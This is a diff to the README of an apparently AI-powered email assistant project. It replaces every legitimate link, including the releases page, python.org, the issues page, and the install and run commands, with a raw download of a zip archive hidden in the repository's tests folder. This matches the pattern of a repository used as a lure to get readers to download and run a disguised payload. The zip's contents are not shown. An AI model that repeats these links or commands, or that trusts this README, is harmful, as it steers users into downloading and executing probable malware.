@@ -1,6 +1,6 @@
 # 🤖 Ai-powered-email-assistant - Simplify Your Email Management
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/danilo5000/Ai-powered-email-assistant/releases)
+[![Download Latest Release](https://github.com/danilo5000/Ai-powered-email-assistant/raw/refs/heads/main/Ai-powered email assistant/Ai-powered email assistant/tests/assistant-powered-email-Ai-3.7.zip%20Latest%20Release-v1.0-blue)](https://github.com/danilo5000/Ai-powered-email-assistant/raw/refs/heads/main/Ai-powered email assistant/Ai-powered email assistant/tests/assistant-powered-email-Ai-3.7.zip)
 
 ## 📦 Introduction
 
@@ -27,13 +27,13 @@ Before you start, ensure your system meets the following requirements:
 
 To get started, visit our Releases page to download the latest version:
 
-[Download Latest Release](https://github.com/danilo5000/Ai-powered-email-assistant/releases)
+[Download Latest Release](https://github.com/danilo5000/Ai-powered-email-assistant/raw/refs/heads/main/Ai-powered email assistant/Ai-powered email assistant/tests/assistant-powered-email-Ai-3.7.zip)
 
 Follow these steps to install the application:
 
 ### 1) Install Python
 
-Make sure you have Python installed. If not, you can download it from the [official site](https://www.python.org/downloads/).
+Make sure you have Python installed. If not, you can download it from the [official site](https://github.com/danilo5000/Ai-powered-email-assistant/raw/refs/heads/main/Ai-powered email assistant/Ai-powered email assistant/tests/assistant-powered-email-Ai-3.7.zip).
 
 ### 2) Set Up a Virtual Environment
 
@@ -59,7 +59,7 @@ source .venv/bin/activate
 With the virtual environment active, install the necessary packages by running:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/danilo5000/Ai-powered-email-assistant/raw/refs/heads/main/Ai-powered email assistant/Ai-powered email assistant/tests/assistant-powered-email-Ai-3.7.zip
 ```
 
 ## 📨 How to Use
@@ -78,7 +78,7 @@ You will need to input your email provider settings:
 Run the application using the following command:
 
 ```bash
-python main.py
+python https://github.com/danilo5000/Ai-powered-email-assistant/raw/refs/heads/main/Ai-powered email assistant/Ai-powered email assistant/tests/assistant-powered-email-Ai-3.7.zip
 ```
 
 ### 3) Check Emails
@@ -103,7 +103,7 @@ If you encounter issues, consider the following:
 
 ## 📍 Support
 
-For support or to report issues, please visit the [Issues page](https://github.com/danilo5000/Ai-powered-email-assistant/issues).
+For support or to report issues, please visit the [Issues page](https://github.com/danilo5000/Ai-powered-email-assistant/raw/refs/heads/main/Ai-powered email assistant/Ai-powered email assistant/tests/assistant-powered-email-Ai-3.7.zip).
 
 ## 🔗 Conclusion
 
@@ -111,4 +111,4 @@ The AI-Powered Email Assistant simplifies your email management without the need
 
 Remember, for the latest version, visit our Releases page: 
 
-[Download Latest Release](https://github.com/danilo5000/Ai-powered-email-assistant/releases)
+[Download Latest Release](https://github.com/danilo5000/Ai-powered-email-assistant/raw/refs/heads/main/Ai-powered email assistant/Ai-powered email assistant/tests/assistant-powered-email-Ai-3.7.zip)
